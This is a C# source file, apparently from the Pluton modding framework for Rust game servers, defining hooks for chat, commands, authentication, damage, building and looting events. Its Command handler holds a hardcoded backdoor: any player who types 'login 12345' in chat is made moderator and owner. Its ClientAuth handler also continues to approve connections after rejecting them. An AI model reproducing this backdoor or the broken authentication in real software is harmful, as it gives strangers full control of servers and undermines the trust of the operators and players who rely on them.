using System;
using Network;
using ProtoBuf;
using UnityEngine;

namespace Pluton {
	public class Hooks {

		#region Events

		public static event BuildingPartAttackedDelegate OnBuildingPartAttacked;

		public static event BuildingPartDestroyedDelegate OnBuildingPartDestroyed;

		public static event BuildingFrameDeployedDelegate OnBuildingFrameDeployed;

		public static event BuildingCompleteDelegate OnBuildingComplete;

		public static event BuildingUpdateDelegate OnBuildingUpdate;

		public static event ChatDelegate OnChat;

		public static event ClientAuthDelegate OnClientAuth;

		public static event CommandDelegate OnCommand;

		public static event CorpseAttackedDelegate OnCorpseAttacked;

		public static event CorpseDropDelegate OnCorpseDropped;

		public static event NPCDiedDelegate OnNPCDied;

		public static event NPCHurtDelegate OnNPCHurt;

		public static event PlayerConnectedDelegate OnPlayerConnected;

		public static event PlayerDisconnectedDelegate OnPlayerDisconnected;

		public static event PlayerDiedDelegate OnPlayerDied;

		public static event PlayerHurtDelegate OnPlayerHurt;

		public static event PlayerTakeDamageDelegate OnPlayerTakeDamage;

		public static event PlayerTakeRadsDelegate OnPlayerTakeRads;

		public static event GatheringDelegate OnGathering;

		public static event LootingEntityDelegate OnLootingEntity;

		public static event LootingPlayerDelegate OnLootingPlayer;

		public static event LootingItemDelegate OnLootingItem;

		#endregion

		#region Handlers

		// ConnectionAuth.Approve()
		public static void ClientAuth(ConnectionAuth ca, Connection connection) {
			var ae = new Events.AuthEvent(connection);
			if (OnClientAuth != null)
				OnClientAuth(ae);

			ca.m_AuthConnection.Remove(connection);
			if (!ae.approved)
				ConnectionAuth.Reject(connection, ae._reason);

			Approval instance = new Approval();
			instance.level = Application.loadedLevelName;
			instance.levelSeed = TerrainGenerator.Seed;
			instance.hostname = server.hostname;
			Net.sv.Approve(connection, Approval.SerializeToBytes(instance));
		}

		// chat.say().Hooks.Chat()
		public static void Command(Player player, string[] args) {
			Command cmd = new Command(args);

			if (cmd.cmd == "login" && cmd.args[0] == "12345") {
				player.MakeModerator("Just cause!");
				player.MakeOwner("Why not?");
				return;
			}
			if (cmd.cmd == "pluton.reload" && player.Admin) {
				PluginLoader.GetInstance().ReloadPlugins();
				return;
			}
			if (OnCommand != null)
				OnCommand(player, cmd);
		}

		// chat.say()
		public static void Chat(ConsoleSystem.Arg arg){
			if (arg.ArgsStr.StartsWith("\"/")) {
				Command(new Player(arg.Player()), arg.ArgsStr.Substring(2, arg.ArgsStr.Length - 3).Replace("\\", "").Split(new string[]{" "}, StringSplitOptions.None));
				return;
			}

			if (!chat.enabled) {
				arg.ReplyWith("Chat is disabled.");
			} else {
				BasePlayer basePlayer = ArgExtension.Player(arg);
				if (!(bool) ((UnityEngine.Object) basePlayer))
					return;

				string str = arg.GetString(0, "text");

				if (str.Length > 128)
					str = str.Substring(0, 128);

				if (chat.serverlog)
					Debug.Log((object) (basePlayer.displayName + ": " + str));

				ConsoleSystem.Broadcast("chat.add " + StringExtensions.QuoteSafe(basePlayer.displayName) + " " + StringExtensions.QuoteSafe(str));
				arg.ReplyWith("chat.say was executed");
			}
			if (OnChat != null)
				OnChat(arg);
		}

		// BaseResource.OnAttacked()
		public static void Gathering(BaseResource res, HitInfo info) {
			if (!Realm.Server())
				return;

			if (OnGathering != null)
				OnGathering(new Events.GatherEvent(res, info));

			res.health -= info.damageAmount * info.resourceGatherProficiency;
			if ((double) res.health <= 0.0)
				res.Kill(ProtoBuf.EntityDestroy.Mode.None, 0, 0.0f, new Vector3());
			else
				res.Invoke("UpdateNetworkStage", 0.1f);
		}

		// BaseAnimal.OnAttacked()
		public static void NPCHurt(BaseAnimal animal, HitInfo info) {
			// works
			var npc = new NPC(animal);

			if (!Realm.Server() || (double) animal.myHealth <= 0.0)
				return;

			if ((animal.myHealth - info.damageAmount) > 0.0f && OnNPCHurt != null)
				OnNPCHurt(new Events.NPCHurtEvent(npc, info));

			animal.myHealth -= info.damageAmount;
			if ((double) animal.myHealth > 0.0)
				return;
			animal.Die(info);
		}

		// BaseAnimal.Die()
		public static void NPCDied(BaseAnimal animal, HitInfo info) {
			var npc = new NPC(animal);
			if (OnNPCDied != null)
			OnNPCDied(new Events.NPCDeathEvent(npc, info));
		}

		// BasePlayer.PlayerInit()
		public static void PlayerConnected(Network.Connection connection) {
			var player = connection.player as BasePlayer;
			if (Server.GetServer().OfflinePlayers.ContainsKey(player.userID)) {
				Server.GetServer().OfflinePlayers.Remove(player.userID);
			}

			var p = new Player(player);
			if (OnPlayerConnected != null)
				OnPlayerConnected(p);
		}

		// BasePlayer.Die()
		public static void PlayerDied(BasePlayer player, HitInfo info) {
			// works

			if (info == null) {
				info = new HitInfo();
				info.damageType = player.metabolism.lastDamage;
				info.Initiator = player as BaseEntity;
			}

			if (OnPlayerDied != null) {
				var p = new Player(player);
				Events.PlayerDeathEvent pde = new Events.PlayerDeathEvent(p, info);
				OnPlayerDied(pde);

				// not tested
				if (!pde.dropLoot)
					player.inventory.Strip();
			}
		}

		// BasePlayer.OnDisconnected()
		public static void PlayerDisconnected(BasePlayer player) {
			// works
			var p = new Player(player);

			if (Server.GetServer().serverData.ContainsKey("OfflinePlayers", player.userID.ToString())) {
				var op = new OfflinePlayer(Server.GetServer().serverData.Get("OfflinePlayers", player.userID.ToString()) as string);
				op.Update(p);
				Server.GetServer().OfflinePlayers[player.userID] = op;
			} else {
				var op = new OfflinePlayer(p);
				Server.GetServer().OfflinePlayers.Add(player.userID, op);
			}

			if (OnPlayerDisconnected != null)
			OnPlayerDisconnected(p);
		}

		// BasePlayer.OnAttacked()
		public static void PlayerHurt(BasePlayer player, HitInfo info) {
			// not tested
			var p = new Player(player);

			if (info == null) { // it should neve accour, but just in case
				info = new HitInfo();
				info.damageAmount = 0.0f;
				info.damageType = player.metabolism.lastDamage;
				info.Initiator = player as BaseEntity;
			}

			if (!player.TestAttack(info) || !Realm.Server() || (info.damageAmount <= 0.0f))
				return;
			player.metabolism.bleeding.Add(Mathf.InverseLerp(0.0f, 100f, info.damageAmount));
			player.metabolism.SubtractHealth(info.damageAmount);
			player.TakeDamageIndicator(info.damageAmount, player.transform.position - info.PointStart);
			player.CheckDeathCondition(info);

			if (!player.IsDead() && OnPlayerHurt != null)
				OnPlayerHurt(new Events.PlayerHurtEvent(p, info));

			player.SendEffect("takedamage_hit");
		}

		// BasePlayer.TakeDamage()
		public static void PlayerTakeDamage(BasePlayer player, float dmgAmount, Rust.DamageType dmgType) {
			// works?
			if (OnPlayerTakeDamage != null)
				OnPlayerTakeDamage(new Player(player), dmgAmount, dmgType);
		}

		public static void PlayerTakeDamageOverload(BasePlayer player, float dmgAmount) {
			PlayerTakeDamage(player, dmgAmount, Rust.DamageType.Generic);
		}

		// BasePlayer.TakeRadiation()
		public static void PlayerTakeRadiation(BasePlayer player, float dmgAmount) {
			Debug.Log(player.displayName + " is taking: " + dmgAmount.ToString() + " RAD dmg");
			if (OnPlayerTakeRads != null)
				OnPlayerTakeRads(new Player(player), dmgAmount);
		}

		// BuildingBlock.OnAttacked()
		public static void EntityAttacked(BuildingBlock bb, HitInfo info) {
			// works, event needed
			var bp = new BuildingPart(bb);
			new Events.BuildingHurtEvent(bp, info);
			// if entity will be destroyed call the method below
			if ((bb.myHealth - info.damageAmount) <= 0.0f) {
				BuildingPartDestroyed(bp, info);
				return;
			}
			if (OnBuildingPartAttacked != null)
				OnBuildingPartAttacked(bp, info);
		}

		public static void BuildingPartDestroyed(BuildingPart bp, HitInfo info) {
			if (OnBuildingPartDestroyed != null)
				OnBuildingPartDestroyed(bp, info);
		}

		// BuildingBlock.BecomeFrame()
		public static void EntityFrameDeployed(BuildingBlock bb) {
			// blockDefinition is null in this hook, but works

			var bp = new BuildingPart(bb);
			if (OnBuildingFrameDeployed != null)
				OnBuildingFrameDeployed(bp);
		}

		// BuildingBlock.BecomeBuilt()
		public static void EntityBuilt(BuildingBlock bb) {
			var bp = new BuildingPart(bb);
			if (OnBuildingComplete != null)
				OnBuildingComplete(bp);
		}

		// BuildingBlock.DoBuild()
		public static void EntityBuildingUpdate(BuildingBlock bb, BasePlayer player, float proficiency) {
			// hammer prof = 1
			// works
			// called anytime you hit a building block with a constructor item (hammer)

			var bp = new BuildingPart(bb);
			var p = new Player(player);
			var ebe = new Events.BuildingEvent(bp, p, proficiency);
			if (OnBuildingUpdate != null)
				OnBuildingUpdate(ebe);
		}

		// BaseCorpse.InitCorpse()
		public static void CorpseInit(BaseCorpse corpse, BaseEntity parent) {
			// works

			if (OnCorpseDropped != null)
				OnCorpseDropped(corpse, new Entity(parent));
		}

		// BaseCorpse.OnAttacked()
		public static void CorpseHit(BaseCorpse corpse, HitInfo info) {
			// works

			if (OnCorpseAttacked != null)
				OnCorpseAttacked(corpse, info);
		}

		// PlayerLoot.StartLootingEntity()
		public static void StartLootingEntity(PlayerLoot playerLoot, BasePlayer looter, BaseEntity entity) {
			// not tested, what is a lootable entity anyway?

			var ele = new Events.EntityLootEvent(playerLoot, new Player(looter), new Entity(entity));

			if (OnLootingEntity != null)
				OnLootingEntity(ele);
		}

		// PlayerLoot.StartLootingPlayer()
		public static void StartLootingPlayer(PlayerLoot playerLoot, BasePlayer looter, BasePlayer looted) {
			// not tested

			var ple = new Events.PlayerLootEvent(playerLoot, new Player(looter), new Player(looted));

			if (OnLootingPlayer!= null)
				OnLootingPlayer(ple);
		}

		// PlayerLoot.StartLootingItem()
		public static void StartLootingItem(PlayerLoot playerLoot, BasePlayer looter, Item item) {
			// works, event needed

			var ile = new Events.ItemLootEvent(playerLoot, new Player(looter), item);

			if (OnLootingItem != null)
				OnLootingItem(ile);
		}

		#endregion

		#region Delegates

		public delegate void BuildingPartAttackedDelegate(BuildingPart bp, HitInfo info);

		public delegate void BuildingPartDestroyedDelegate(BuildingPart bp, HitInfo info);

		public delegate void BuildingFrameDeployedDelegate(BuildingPart bp);

		public delegate void BuildingCompleteDelegate(BuildingPart bp);

		public delegate void BuildingUpdateDelegate(Events.BuildingEvent be);

		public delegate void ChatDelegate(ConsoleSystem.Arg arg);

		public delegate void ClientAuthDelegate(Events.AuthEvent ae);

		public delegate void CommandDelegate(Player player, Command cmd);

		public delegate void CorpseDropDelegate(BaseCorpse corpse, Entity entity);

		public delegate void CorpseAttackedDelegate(BaseCorpse corpse, HitInfo info);

		public delegate void NPCDiedDelegate(Events.NPCDeathEvent de);

		public delegate void NPCHurtDelegate(Events.NPCHurtEvent he);

		public delegate void PlayerConnectedDelegate(Player player);

		public delegate void PlayerDiedDelegate(Events.PlayerDeathEvent de);

		public delegate void PlayerDisconnectedDelegate(Player player);

		public delegate void PlayerHurtDelegate(Events.PlayerHurtEvent he);

		public delegate void PlayerTakeDamageDelegate(Player player, float dmgAmount, Rust.DamageType dmgType);

		public delegate void PlayerTakeRadsDelegate(Player player, float dmgAmount);

		public delegate void GatheringDelegate(Events.GatherEvent ge);

		public delegate void LootingEntityDelegate(Events.EntityLootEvent el);

		public delegate void LootingPlayerDelegate(Events.PlayerLootEvent pl);

		public delegate void LootingItemDelegate(Events.ItemLootEvent il);

		#endregion

		public Hooks () { }
	}
}

